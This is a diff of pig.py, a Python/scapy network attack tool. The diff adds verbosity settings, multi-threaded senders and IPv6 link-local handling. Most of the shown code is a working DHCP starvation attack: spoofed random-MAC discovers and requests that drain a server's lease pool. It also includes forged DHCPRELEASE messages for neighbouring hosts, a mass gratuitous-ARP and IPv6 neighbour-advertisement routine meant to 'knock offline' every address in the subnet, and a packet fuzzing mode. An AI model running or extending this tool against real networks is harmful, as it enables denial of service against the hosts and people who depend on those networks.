@@ -4,18 +4,23 @@
 enhanced DHCP exhaustion attack plus.
 
 Usage:
-    pig.py [-d -h -6 -f -a -i -o -x -y -z -g -r -n -1 -c] <interface>
+    pig.py [-h -6 -f -a -i -o -x -y -z -g -r -n -1 -c] <interface>
   
 Options:
-    -d, --debug                    ... enable scapy verbose output
     -h, --help                     <-- you are here :)
-    
+    -v, --verbosity                ...  0 ... no 
+                                        1 ... minimal
+                                       10 ... default
+                                       99 ... debug
+                                       
     -6, --ipv6                     ... DHCPv6 (off, DHCPv4 by default)
     -1, --v6-rapid-commit          ... enable RapidCommit (2way ip assignment instead of 4way)
     
     -c, --client-macs              ... a list of client macs 00:11:22:33:44:55,00:11:22:33:44:56 (Default: <random>)
     
     -f, --fuzz                     ... randomly fuzz packets (off)
+
+    -t, --threads                  ... number of sending threads
     
     -a, --show-arp                 ... detect/print arp who_has (off)
     -i, --show-icmp                ... detect/print icmps requests (off)
@@ -30,9 +35,7 @@ Options:
     -z, --timeout-dhcprequest      ... dhcp request timeout (2)
     
     -c, --color                    ... enable color output
-    
 """
-
 
 class Colors:
     class Palette:
@@ -74,10 +77,9 @@ class Colors:
     blink =     "\033[5m"
     invert =    "\033[7m"
 
-
-
 from scapy.all import *
 import string,binascii,signal,sys,threading,socket,struct,getopt
+from sys import stdout
 
 '''
 Defaults
@@ -101,30 +103,55 @@ TIMEOUT['timer']=0.4
 DO_COLOR = False 
 COLORSCHEME = {'<--':Colors.green+"%s"+Colors.endc,
                '<-':Colors.blue+"%s"+Colors.endc,
+               '->':Colors.cyan+"%s"+Colors.endc,
                '-->':Colors.grey+"%s"+Colors.endc,
                '?':Colors.yellow+"%s"+Colors.endc,
                'DEBUG':Colors.purple+"%s"+Colors.endc,
                'NOTICE': Colors.bold+Colors.red+"%s"+Colors.endc,
+               'ERROR': Colors.bold+Colors.red+"%s"+Colors.endc,
+               'WARNING': Colors.bold+Colors.yellow+"%s"+Colors.endc,
                None:'%s'}
+MSGSCHEME = {'<--'      :"[<---] %s",   # inbound
+             '-->'      :"[--->] %s",   # outpund
+             '->'      :"[ -> ] %s",    # icmp / arp out
+             '<-'      :"[ <- ] %s",    # icmp / arp in
+             '?'        :"[ ?? ] %s",   
+             'DEBUG'    :"[DBG ] %s",
+             'NOTICE'   :"[ -- ] %s",
+             'WARNING'  :"[ !! ] %s",
+             'ERROR'    :"[XXXX] %s",
+             }
+MSGSCHEME_MIN = {'<--'  :"!",
+             '-->'      :".",
+             '->'       :":",
+             '<-'       :";",
+             '?'        :"?",
+             'DEBUG'    :"D",
+             'NOTICE'   :"N",
+             'WARNING'  :"W",
+             'ERROR'    :"E",
+             }
 DO_v6_RC = False
+VERBOSITY = 3
+THREAD_CNT = 1
+THREAD_POOL = []
 
 def checkArgs():
-    global SHOW_ARP ,SHOW_ICMP, SHOW_DHCPOPTIONS, TIMEOUT, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE, MAC_LIST, DO_COLOR,DO_v6_RC
+    global SHOW_ARP ,SHOW_ICMP, SHOW_DHCPOPTIONS, TIMEOUT, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE, MAC_LIST, DO_COLOR,DO_v6_RC, VERBOSITY,THREAD_CNT
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "hdaiox:y:z:6fgrnm:c1", ["debug","help","show-arp","show-icmp",
+        opts, args = getopt.getopt(sys.argv[1:], "haiox:y:z:6fgrnm:c1v:t:", ["help","show-arp","show-icmp",
                                                                       "show-options","timeout-threads=","timeout-dos=",
                                                                       "timeout-dhcprequest=", "neighbors-scan-arp",
                                                                       "neighbors-attack-release", "neighbors-attack-garp",
-                                                                      "fuzz","ipv6","client-macs=","color","v6-rapid-commit"])
+                                                                      "fuzz","ipv6","client-macs=","color","v6-rapid-commit",
+                                                                      "verbosity=","threads="])
     except getopt.GetoptError, err:
         # print help information and exit:
         print str(err) # will print something like "option -a not recognized"
         usage()
         sys.exit(2)
     for o,a in opts:
-        if o in ("-d,--debug"):
-            conf.verb = True
-        elif o in ("-h", "--help"):
+        if o in ("-h", "--help"):
             usage()
             sys.exit()
         elif o in ("-a", "--show-arp"):
@@ -155,7 +182,12 @@ def checkArgs():
             DO_COLOR=True
         elif o in ("-1", "--v6-rapid-commit"):
             DO_v6_RC=True
-            
+        elif o in ("-v", "--verbosity"):
+            VERBOSITY=int(a)
+            if VERBOSITY>=99:
+                conf.verb = True
+        elif o in ("-t", "--threads"):
+            THREAD_CNT = int(a)
         else:
             assert False, "unhandled option"
     if len(args)==1:
@@ -191,17 +223,37 @@ def checkArgs():
 
 
 def LOG(message=None,type=None):
-    if DO_COLOR:
-        message = COLORSCHEME[type]%message
-    print message
+    if VERBOSITY<=0:
+        return
+    elif VERBOSITY==1:
+        #minimal verbosity ...   dot style output
+        if type in MSGSCHEME_MIN:
+            message = MSGSCHEME_MIN[type]
+            if DO_COLOR and type in COLORSCHEME:
+                message = COLORSCHEME[type]%message
+            stdout.write("%s"%message)
+            stdout.flush()
+    else:
+        if type in MSGSCHEME:
+            message = MSGSCHEME[type]%message
+        if DO_COLOR and type in COLORSCHEME:
+            message = COLORSCHEME[type]%message
+        if MODE_FUZZ:
+            stdout.write("[FUZZ] %s\n"% (message))
+        else:
+            stdout.write("%s\n"% (message))
+        stdout.flush()
 
 def signal_handler(signal, frame):
-    LOG(type="NOTICE", message= ' -----  Exiting...  -----')
-    t1.kill_received = True
-    t2.kill_received = True
+    LOG(type="NOTICE", message= ' -----  ABORT ...  -----')
+    i = 0
+    for t in THREAD_POOL:
+        t.kill_received = True
+        LOG(type="DEBUG", message= 'Waiting for Thread %d to die ...'%i)
+        i+=1
+    #t1.kill_received = True
+    #t2.kill_received = True
     sys.exit(0)
-
-
 
 ######################################
 # Necessary Network functions not included in scapy
@@ -278,12 +330,16 @@ s2c -> reply
 def v6_build_ether(mac):
     IPv6mcast="33:33:00:01:00:02"
     #IPv6LL="fe80::20c:29ff:fef8:a1c8"
+    IPv6LL = [addr for addr,y,intf in in6_getifaddr() if intf==conf.iface]
+    if len(IPv6LL)>0:
+        IPv6LL=IPv6LL[0]
+    else:
+        LOG(type="NOTICE",message="Could not determine v6 Link-Local Address")
+        exit()
     IPv6bcast="ff02::1:2"
     IPv6DHCP_CLI_Port=546
     IPv6DHCP_SRV_Port=547
-    # buf fix: let scapy choose source LL address
-    #ethead=Ether(src=mac,dst=IPv6mcast)/IPv6(src=IPv6LL,dst=IPv6bcast)/UDP(sport=IPv6DHCP_CLI_Port,dport=IPv6DHCP_SRV_Port)
-    ethead=Ether(src=mac,dst=IPv6mcast)/IPv6(dst=IPv6bcast)/UDP(sport=IPv6DHCP_CLI_Port,dport=IPv6DHCP_SRV_Port)
+    ethead=Ether(src=mac,dst=IPv6mcast)/IPv6(src=IPv6LL,dst=IPv6bcast)/UDP(sport=IPv6DHCP_CLI_Port,dport=IPv6DHCP_SRV_Port)
     return ethead
 
 def v6_build_discover(mac,trid=None):
@@ -307,7 +363,9 @@ def v6_build_request(p_advertise,iaid=0xf,trid=None,options=[23,24]):
 
 def sendPacket(pkt):
     if MODE_FUZZ:
-        pkt = fuzz(pkt)
+        # only fuzz: UDP with payload of UDP (DHCP messages)
+        pkt[UDP] = fuzz(pkt[UDP])
+    #pkt = [pkt]*100
     sendp(pkt,iface=conf.iface)
 
 ##########################################################
@@ -318,7 +376,7 @@ def neighbors():
     global dhcpsip,subnet,nodes
     nodes={}
     if MODE_IPv6:
-        LOG(type="NOTICE", message= "[ !! ] IPv6 - neighbors() not supported at this point ")
+        LOG(type="WARNING", message= "IPv6 - neighbors() not supported at this point ")
     else:
         m=randomMAC()
         net=dhcpsip+"/"+calcCIDR(subnet)
@@ -334,7 +392,7 @@ def neighbors():
 def release():
     global dhcpsmac,dhcpsip,nodes
     if MODE_IPv6:
-        LOG(type="NOTICE", message= "[ !! ] IPv6 - release() not supported at this point ")
+        LOG(type="WARNING", message= " IPv6 - release() not supported at this point ")
     else:
         LOG(type="NOTICE", message= "***  Sending DHCPRELEASE for neighbors ")
         myxid=random.randint(1, 900000000)
@@ -352,7 +410,7 @@ def release():
 def garp():
     global dhcpsip,subnet
     if MODE_IPv6:
-        LOG(type="NOTICE", message= "[ !! ] IPv6 - gratious_arp() not supported at this point ")
+        LOG(type="NOTICE", message= "IPv6 - gratious_arp() not supported at this point ")
         return
         pool=Net6(dhcpsip+"/"+calcCIDR(subnet))
         for ip in pool:
@@ -361,7 +419,7 @@ def garp():
             LL_ScopeALL_Multicast_Address="ff02::1"
             arpp = Ether(src=m,dst="33:33:00:00:00:01")/IPv6(src=ip,dst=LL_ScopeALL_Multicast_Address)/ICMPv6ND_NA(tgt=ip,R=0)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00")
             sendPacket(arpp)
-            LOG(type="-->", message= "[ ==>] v6_ICMP_NeighborDiscovery - knock offline  %s"%ip)
+            LOG(type="-->", message= "v6_ICMP_NeighborDiscovery - knock offline  %s"%ip)
             if conf.verb: LOG(type="DEBUG", message=  "%r"%arpp)
     else:
         pool=Net(dhcpsip+"/"+calcCIDR(subnet))
@@ -369,7 +427,7 @@ def garp():
             m=randomMAC()
             arpp =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m,psrc=ip,hwdst="00:00:00:00:00:00",pdst=ip)
             sendPacket(arpp)
-            LOG(type="-->", message= "[ ==>] Gratious_ARP - knock offline %s"%ip)
+            LOG(type="-->", message= "Gratious_ARP - knock offline %s"%ip)
             if conf.verb: LOG(type="DEBUG", message=  "%r"%arpp)
 
 #
@@ -381,7 +439,7 @@ class send_dhcp(threading.Thread):
         self.kill_received = False
 
     def run(self):
-        global timer,dhcpdos
+        global TIMEOUT,dhcpdos
         while not self.kill_received and not dhcpdos:
             m=randomMAC()
             #m="00:00:00:00:00:00"
@@ -389,12 +447,12 @@ class send_dhcp(threading.Thread):
             hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
             if MODE_IPv6:
                 dhcp_discover=v6_build_discover(m,trid=myxid)
-                LOG(type="-->", message= "[--->] v6_DHCP_Discover [cid:%s]"%(repr(str(dhcp_discover[DHCP6OptClientId].duid))))
+                LOG(type="-->", message= "v6_DHCP_Discover [cid:%s]"%(repr(str(dhcp_discover[DHCP6OptClientId].duid))))
             else:
                 dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
-                LOG(type="-->", message= "[--->] DHCP_Discover")
+                LOG(type="-->", message= "DHCP_Discover")
             sendPacket(dhcp_discover)
-            time.sleep(timer)
+            if TIMEOUT['timer']: time.sleep(TIMEOUT['timer'])
 
 #
 #
@@ -414,9 +472,9 @@ class sniff_dhcp(threading.Thread):
         global dhcpdos
         while not self.kill_received and not dhcpdos:
             sniff(filter=self.filter,prn=self.detect_dhcp,store=0,timeout=3,iface=conf.iface)
-            if self.dhcpcount>0 : LOG(type="NOTICE", message= "[ !! ] timeout waiting on dhcp packet count %d"%self.dhcpcount)
+            if self.dhcpcount>0 : LOG(type="NOTICE", message= "timeout waiting on dhcp packet count %d"%self.dhcpcount)
             self.dhcpcount+=1
-            if self.dhcpcount==5: dhcpdos=True
+            if not MODE_FUZZ and self.dhcpcount==5: dhcpdos=True
           
     def detect_dhcp(self,pkt):
         global dhcpsmac,dhcpsip,subnet,SHOW_ARP,SHOW_DHCPOPTIONS,SHOW_ICMP,DO_v6_RC
@@ -431,7 +489,7 @@ class sniff_dhcp(threading.Thread):
                     #localm=unpackMAC(pkt[BOOTP].chaddr)
                     myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
             
-                    LOG(type="<--", message=("[<---] v6 ADVERTISE FROM [%s] -> [%s] - LEASE: IPv6[%s]"%(sip,cip,myip)))
+                    LOG(type="<--", message=("v6 ADVERTISE FROM [%s] -> [%s] - LEASE: IPv6[%s]"%(sip,cip,myip)))
                     if SHOW_DHCPOPTIONS:
                         b = pkt[DHCP6_Advertise]
                         b=str(b.show)
@@ -442,10 +500,10 @@ class sniff_dhcp(threading.Thread):
                         # we dont need to request the address if we're using rapid commit mode (2 message: solict / reply)
                         dhcp_req=v6_build_request(pkt,options=range(30))
                         sendPacket(dhcp_req)
-                        LOG(type="-->", message= "[--->] v6 REQUEST ACK IPv6[%s]\n"%myip)
+                        LOG(type="-->", message= "v6 REQUEST ACK IPv6[%s]\n"%myip)
 
             elif ICMPv6ND_NS in pkt and ICMPv6NDOptSrcLLAddr in pkt and SHOW_ICMP:
-                LOG(type="<-", message= "[<---] v6 ICMP REQUEST FROM [%s] -> [%s]"%(pkt[ICMPv6NDOptSrcLLAddr].lladdr,pkt[ICMPv6ND_NS].tgt)) 
+                LOG(type="<-", message= "v6 ICMP REQUEST FROM [%s] -> [%s]"%(pkt[ICMPv6NDOptSrcLLAddr].lladdr,pkt[ICMPv6ND_NS].tgt)) 
         else:
             if DHCP in pkt:
                 if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
@@ -462,7 +520,7 @@ class sniff_dhcp(threading.Thread):
                     localxid=pkt[BOOTP].xid
                     localm=unpackMAC(pkt[BOOTP].chaddr)
                     myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
-                    LOG(type="<--", message= "[<---] DHCP_Offer   " + pkt[Ether].src +"\t"+sip + " IP: "+myip+" for MAC=["+pkt[Ether].dst+"]")
+                    LOG(type="<--", message= "DHCP_Offer   " + pkt[Ether].src +"\t"+sip + " IP: "+myip+" for MAC=["+pkt[Ether].dst+"]")
     
                     if SHOW_DHCPOPTIONS:
                         b = pkt[BOOTP]
@@ -481,13 +539,13 @@ class sniff_dhcp(threading.Thread):
                                 LOG(type="DEBUG", message=  "\t\t* %s\t%s"%(o[0],o[1:])  )    
                     
                     dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
-                    LOG(type="-->", message= "[--->] DHCP_Request "+myip)
+                    LOG(type="-->", message= "DHCP_Request "+myip)
                     sendPacket(dhcp_req)
             elif ICMP in pkt:
                 if pkt[ICMP].type==8:
                     myip=pkt[IP].dst
                     mydst=pkt[IP].src
-                    if SHOW_ICMP: LOG(type="<-", message= "[ <- ] ICMP_Request "+mydst+" for "+myip )
+                    if SHOW_ICMP: LOG(type="<-", message= "ICMP_Request "+mydst+" for "+myip )
                     icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
                     if conf.verb: 
                         LOG(type="DEBUG", message=  "%r"%icmp_req )
@@ -498,7 +556,7 @@ class sniff_dhcp(threading.Thread):
                 if pkt[ARP].op ==1:        #op=1 who has, 2 is at
                     myip=pkt[ARP].pdst
                     mydst=pkt[ARP].psrc
-                    if SHOW_ARP: LOG(type="<-", message= "[ <- ] ARP_Request " + myip+" from "+mydst)
+                    if SHOW_ARP: LOG(type="<-", message= "ARP_Request " + myip+" from "+mydst)
                     #todo(tintinweb):answer arps?
 
 
@@ -507,7 +565,8 @@ class sniff_dhcp(threading.Thread):
 # MAIN()
 #
 def main():
-    global t1,t2,t3,dhcpdos,dhcpsip,dhcpmac,subnet,nodes,timer
+    global THREAD_POOL,dhcpdos,dhcpsip,dhcpsmac,subnet,nodes,THREAD_CNT
+    
     checkArgs()
     LOG(type="NOTICE", message= "[INFO] - using interface %s"%conf.iface)
     signal.signal(signal.SIGINT, signal_handler)
@@ -516,18 +575,23 @@ def main():
     subnet=None
     nodes={}
     dhcpdos=False 
-    timer=TIMEOUT['timer']
+
     
-    t1=sniff_dhcp()
-    t1.start()
+    LOG(type="DEBUG",message="Thread %d - (Sniffer) READY"%len(THREAD_POOL))
+    t=sniff_dhcp()
+    t.start()
+    THREAD_POOL.append(t)
     
-    t2=send_dhcp()
-    t2.start()
-    
+    for i in range(THREAD_CNT):
+        LOG(type="DEBUG",message="Thread %d - (Sender) READY"%len(THREAD_POOL))
+        t=send_dhcp()
+        t.start()
+        THREAD_POOL.append(t)
+        
     fail_cnt=5
     while dhcpsip==None and fail_cnt<=0:
         time.sleep(TIMEOUT['dhcpip'])
-        LOG(type="?", message= "[  ? ] \t\twaiting for first DHCP Server response")
+        LOG(type="?", message= "\t\twaiting for first DHCP Server response")
         fail_cnt-=1
     
     if fail_cnt==0:
@@ -540,7 +604,7 @@ def main():
     
     while not dhcpdos:
         time.sleep(TIMEOUT['dos'])
-        LOG(type="?", message= "[  ? ] \t\twaiting for DHCP pool exhaustion...")
+        LOG(type="?", message= " \t\twaiting for DHCP pool exhaustion...")
     
     if DO_GARP:   
         LOG(type="NOTICE", message= "[INFO] waiting %s to mass grat.arp!"%TIMEOUT['dos'])
@@ -553,6 +617,4 @@ def usage():
     
 if __name__ == '__main__':
     main()
-
-
-
+    print "\n"
